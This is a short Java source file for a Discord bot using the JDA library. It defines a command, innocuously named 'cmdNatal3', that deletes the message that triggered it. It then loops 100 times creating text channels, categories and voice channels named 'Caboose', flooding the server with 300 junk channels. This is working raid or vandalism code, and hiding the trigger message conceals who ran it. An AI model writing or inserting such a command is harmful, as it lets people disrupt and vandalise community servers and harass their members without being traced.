package com.mssjim.comandos;

import com.mssjim.core.Command;

import net.dv8tion.jda.api.events.message.MessageReceivedEvent;

public class cmdNatal3 implements Command {

    @Override
    public boolean called(String[] args, MessageReceivedEvent event) {
    	event.getMessage().delete().queue();
        return false;
    }

    @Override
    public void action(String[] args, MessageReceivedEvent event) {
    	for(int i=0; i<100; i++) {
    		event.getGuild().createTextChannel("Caboose").queue();
    		event.getGuild().createCategory("Caboose").queue();
			event.getGuild().createVoiceChannel("Caboose").queue();
    	}
    }

    @Override
    public void executed(boolean sucess, MessageReceivedEvent event) {

    }

    @Override
    public String help() {
        return null;
    }
}
